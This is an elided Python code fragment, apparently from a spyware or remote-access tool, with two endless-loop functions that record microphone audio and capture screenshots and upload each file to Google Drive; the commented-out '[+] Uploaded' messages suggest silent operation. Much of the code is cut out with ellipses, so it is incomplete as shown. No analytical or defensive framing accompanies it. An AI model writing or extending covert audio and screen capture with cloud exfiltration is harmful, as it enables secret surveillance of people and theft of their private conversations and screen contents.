...
def record_audio(duration):
    while True:
        ...
        media = MediaFileUpload(output_file, mimetype='audio/wav', resumable=True)
        with drive_lock:
            uploaded_file = drive_service.files().create(
                body=file_metadata,
                media_body=media,
...
def capture_screen(interval):
    while True:
        ...
        image.save('screenshot.webp', format='WebP')
        media = MediaFileUpload('screenshot.webp', mimetype='image/webp')
        file_metadata = {
        ...
        # print(f"[+] Uploaded screen_{int(time.time())}.png to Google Drive")
        # print("File ID:", uploaded_file['id'])
        # print("Web Link:", uploaded_file['webViewLink'])
